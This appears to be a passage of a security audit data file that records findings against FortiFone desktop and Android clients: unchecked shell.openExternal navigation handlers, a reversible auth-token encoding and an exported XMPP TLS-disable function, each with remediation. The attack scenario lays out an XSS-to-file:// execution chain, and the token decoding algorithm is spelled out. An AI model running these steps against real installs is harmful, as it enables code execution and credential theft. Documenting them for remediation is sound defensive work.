    "description": (
        "Three `will-navigate` / `setWindowOpenHandler` handlers call shell.openExternal(url) directly "
        "without URL scheme validation: guiWin (main.js:1121), callWindow (main.js:1428), "
        "and mainWindow (main.js:1918 -- meeting window). "
        "In contrast, deep links from OS protocol handlers go through fvMainExternalLinkHandler.validateProtocol(), "
        "which allowlists only 'fortifone:' and 'tel:' via the fvExternalLinkProtocol enum. "
        "The will-navigate handlers skip this allowlist entirely. "
        "Attack path: XSS in guiWin renderer (FFF-F06) -> window.location = 'file:///path/to/exe' -> "
        "will-navigate event fires -> handleRedirect calls details.preventDefault() and shell.openExternal('file:///path/to/exe'). "
        "On Windows: shell.openExternal('file:///C:\\\\path\\\\exec.exe') invokes ShellExecute -> process execution. "
        "On Linux/macOS: file:// opens file manager (info disclosure, path confirmation). "
        "The attack requires XSS code execution in the renderer (FFF-F06 prerequisite), making this "
        "a secondary chain from the already-critical nodeIntegration:true vuln."
    ),

    "code_evidence": {
        "guiwin_handler":    "main.js:1116-1128: handleRedirect = (details) => { if (details.url !== sender_url) { details.preventDefault(); shell.openExternal(details.url); } }; guiWin.webContents.on('will-navigate', handleRedirect)",
        "callwin_handler":   "main.js:1424-1434: same pattern for callWindow; shell.openExternal(details.url) without scheme check",
        "meeting_handler":   "main.js:1910-1919: if (openExternally) { shell.openExternal(navUrl); } -- meeting window (FortiMeet)",
        "allowlist_present_elsewhere": "appAssistant/externalLinkHandler.js:20-24: fvMainExternalLinkHandler.validateProtocol() uses fvExternalLinkProtocol = {FORTIFONE:'fortifone:', TEL:'tel:'} -- allowlist NOT applied to will-navigate paths",
        "external_link_handler_bypass": "main.js:684+1092: deeplinkingUrl uses externalLinkHandler.execute() (validated); will-navigate bypasses execute()",
    },

    "attack_scenario": {
        "platform":    "Windows (highest severity -- file:// executes via ShellExecute)",
        "prerequisite": "XSS in guiWin/callWindow renderer content (FFF-F06 -- nodeIntegration:true)",
        "steps": [
            "1. XSS in SIP caller-ID or chat message loaded in callWindow renderer",
            "2. XSS calls: window.location = 'file:///C:\\\\Users\\\\victim\\\\AppData\\\\Roaming\\\\malware.exe'",
            "3. will-navigate fires: details.url = 'file:///C:/Users/victim/AppData/Roaming/malware.exe'",
            "4. handleRedirect: details.url != callWindow.getURL() -> details.preventDefault() -> shell.openExternal(url)",
            "5. Windows ShellExecute opens/executes the file",
        ],
        "linux_variant": "shell.openExternal('file:///etc/passwd') opens file manager at /etc -> path enumeration",
    },

    "remediation": (
        "In all will-navigate / setWindowOpenHandler callbacks, validate URL scheme before calling "
        "shell.openExternal: only allow 'https:', 'http:', 'mailto:', 'tel:'. "
        "Reject 'file:', 'javascript:', 'data:' and all custom protocols. "
        "Integrate fvMainExternalLinkHandler.validateProtocol() into the will-navigate path. "
        "Per Electron security best practices: the will-navigate handler should also verify "
        "the navigation target is on an expected domain before calling shell.openExternal."
    ),
}


# =============================================================
# FortiFone UC Android -- com.fortinet.fvuc.app v8.0.2.250
# Source: com.fortinet.fvuc.app.apk (83MB, ARM64-v8a)
# Analysis: 2026-09-16
# =============================================================

FVUC_ANDROID_PLATFORM = {
    "product":      "FortiFone UC (Unified Communications) for Android",
    "package":      "com.fortinet.fvuc.app",
    "version":      "8.0.2.250",
    "arch":         "ARM64-v8a (native libs only; Flutter/Dart app + Kotlin/Java wrapper)",
    "native_libs": {
        "libfvuc.so (14MB)":     "Core VoIP/UC logic; PJSIP + Janus WebRTC; FVMagic/FVScramble auth; libcurl; OpenSSL; SRTP; libopus; bcg729; G.722/G.729 codecs",
        "libflutter.so (11MB)":  "Flutter runtime (Dart VM); compiled app logic in libapp.so",
        "libjingle_peerconnection_so.so (11MB)": "Google libjingle WebRTC (peer connection, ICE, DTLS-SRTP)",
        "libapp.so (7.8MB)":     "Compiled Dart business logic (decompile with blutter/reFlutter)",
        "libsqlcipher.so (5MB)": "SQLCipher -- AES-256 encrypted local SQLite DB; passphrase TBD",
        "libadaptivecards-native-lib.so (2.5MB)": "Microsoft Adaptive Cards (in-app IM rich content)",
    },
    "voip_stack":  "PJSIP (pjsip_DOMAIN_STR, PJSIP_EAUTHACCDISABLED, PJSIP_EAUTHACCNOTFOUND) + Janus WebRTC gateway (com.fortinet.janusclientlib.EchoTestActivity)",
    "api_endpoints": ["/api/auth", "/api/ice-servers", "/api/mam_query", "/api/v1", "api/v2", "/api/message (WebSocket)"],
    "cloud_domains": [
        "contacts.fortivoice-cloud.com",
        "cs.fortivoice-cloud.com",
        "phone.fortivoice-cloud.com",
        "fwimage.fortivoice-cloud.com",
        "deeplink.fortivoice-cloud.com",
        "deeplink.dev.fortivoice-cloud.com",
        "deeplink.staging.fortivoice-cloud.com",
        "contacts.staging.fortivoice-cloud.com",
        "cs.dev.fortivoice-cloud.com",
    ],
    "auth_mechanisms": ["JWT (jwts library in libfvuc.so)", "FVMagic token (FVScramble base-10 custom alphabet)", "SSO/OAuth (net.openid.appauth)", "PKI/mTLS (FVDeviceAuthImpl)", "Password (FVVoiceLoginImpl fallback)"],
    "oauth_flow":   "net.openid.appauth; AddOAuthAccountActivity; deeplink.fortivoice-cloud.com for redirect; PKCE not confirmed; oauthresponse custom scheme",
    "xmpp":         "libstrophe; XMPP for FortiIM chat/presence; xmpp_conn_disable_tls exported from libfvuc.so",
    "database":     "SQLCipher encrypted local DB; FVCallLogContentProvider + FVVoicemailContentProvider (ContentProvider endpoints)",
    "firebase":     "Firebase Cloud Messaging (FVUCFirebaseMessagingService) + Crashlytics (crash report telemetry)",
}


# ---------------------------------------------------------
# FFF-F10: FVMagic token -- predictable scramblev2 base-10 encoding
# ---------------------------------------------------------
FFF_F10_FVMAGIC_SCRAMBLEV2 = {
    "id":       "FFF-F10",
    "product":  "FortiFone UC Android v8.0.2.250",
    "severity": "LOW-MEDIUM -- FVMagic token uses a fully reversible custom encoding with published alphabet; "
                "token space (values 0-31) maps to 32 possible values; "
                "combined with JWT and password for auth so standalone forgery does not bypass full auth",
    "class":    "Weak authentication token encoding (CWE-327) -- security through obscurity",

    "description": (
        "FortiFone UC uses FVMagic as a secondary auth credential alongside JWT and password. "
        "The V2 format encodes an integer in base-10 using the alphabet 'scramblev2' "
        "(s=0, c=1, r=2, a=3, m=4, b=5, l=6, e=7, v=8, 2=9). "
        "Values 0-31 map to single letters (value + 0x41 = ASCII character, e.g. 0='A', 25='Z'). "
        "Values > 31 use a secondary encoding path (see decodeV2MagicNumber at 0x3c5574). "
        "The algorithm is fully recoverable from the libfvuc.so binary. "
        "FVScramble::disable_scramble(bool) is exported via JNI (Java_..._FVScramble_1disable_1scramble) "
        "and callable from the app's Java layer -- if reachable from a malicious context, "
        "it disables the scrambling mechanism entirely."
    ),

    "code_evidence": {
        "decode_fn":        "libfvuc.so: _ZN4fvuc10FVScramble19decodeV2MagicNumberERKSs at 0x3c5574",
        "alphabet":         "10 bytes at VA 0xabfbb0 (libfvuc.so .rodata): 73 63 72 61 6d 62 6c 65 76 32 = 'scramblev2'",
        "alphabet_mapping": "s=0, c=1, r=2, a=3, m=4, b=5, l=6, e=7, v=8, 2=9",
        "decode_algo":      "value = 0; for each char: value = value * 10 + alphabet.index(char); if value <= 31: map to char(value+0x41)",
        "disable_fn":       "libfvuc.so: _ZN4fvuc10FVScramble16disable_scrambleEb at 0x3c556c; strb w1, [x0+5]",
        "jni_disable":      "Java_com_fortinet_fvuc_lib_ucbaseJNI_FVScramble_1disable_1scramble at 0x25b54c",
        "token_triple":     "'Account %d: token[%s], magic number[%s], password[%s]' -- all three used together",
        "source_refs":      "FVScramble.cpp lines 156-565 (assertion-heavy, 25+ source line refs visible in binary)",
    },

    "comparison_with_desktop": (
        "FortiFone Desktop (FFF-F03) uses FEScrambler: XOR scramble + base64 encoding. "
        "FortiFone UC Android uses FVScramble: base-10 with 'scramblev2' alphabet. "
        "Both are trivially reversible; both layer custom obfuscation on top of standard auth. "
        "The FEScrambler XOR key was recovered from fvoiceAuthAgent.js; "
        "the FVScramble alphabet is literal ASCII 'scramblev2' in .rodata."
    ),

    "hardcoded_test_sip": {
        "contact":  "Contact: <sip:fake@192.168.10.1:5061>",
        "via":      "Via: SIP/2.0/%s 192.168.10.1:5060;branch=z9hG4bK001b84f6%d-%lu;rport",
        "note":     "Development/test SIP headers with hardcoded 192.168.10.1 addresses present in production binary",
    },
}


# ---------------------------------------------------------
# FFF-F11: xmpp_conn_disable_tls exported from libfvuc.so
# ---------------------------------------------------------
FFF_F11_XMPP_TLS_DISABLE = {
    "id":       "FFF-F11",
    "product":  "FortiFone UC Android v8.0.2.250",
    "severity": "MEDIUM -- XMPP TLS downgrade function exported from native library; "
                "XMPP carries FortiIM chat messages and presence; TLS downgrade exposes credentials and message content",
    "class":    "Cleartext transmission of sensitive information (CWE-319)",

    "description": (
        "libfvuc.so exports xmpp_conn_disable_tls at VA 0x4ae4fc from libstrophe (open-source XMPP library). "
        "If called, it disables TLS for the active XMPP connection, causing credentials and chat messages "
        "to be transmitted in plaintext over the network. "
        "libstrophe's xmpp_conn_disable_tls is a debug API not intended for production use. "
        "Its presence and export in production libfvuc.so indicates either: "
        "(1) libstrophe was linked without stripping debug symbols/exports, or "
        "(2) some code path calls this function (e.g. for testing or fallback). "
        "The XMPP connection carries FortiIM IM messages, presence updates, and group chat. "
        "A network attacker who can intercept the XMPP session (e.g. by injecting a TLS-stripping server) "
        "could observe or inject FortiIM messages. "
        "The 'OAUTHBEARER' and 'XOAUTH2' SASL strings confirm XMPP uses OAuth for authentication; "
        "TLS downgrade would expose the OAuth bearer token."
    ),

    "code_evidence": {
        "export_va":     "libfvuc.so: xmpp_conn_disable_tls at 0x4ae4fc",
        "library_origin": "libstrophe (open-source XMPP library bundled in libfvuc.so)",
        "sasl_mechanisms": "'OAUTHBEARER', 'XOAUTH2' strings confirm OAuth token passed over XMPP SASL",
        "xmpp_component": "JWebSocketClientService (com.fortinet.fvuc.app.websocket) + FortiIM integration",
    },

    "remediation": (
        "Remove or block xmpp_conn_disable_tls from production builds via linker script or symbol visibility. "
        "Enforce TLS_REQUIRED in libstrophe connection config. "
        "Build libstrophe with -fvisibility=hidden and export only the minimum required symbols."
    ),
}
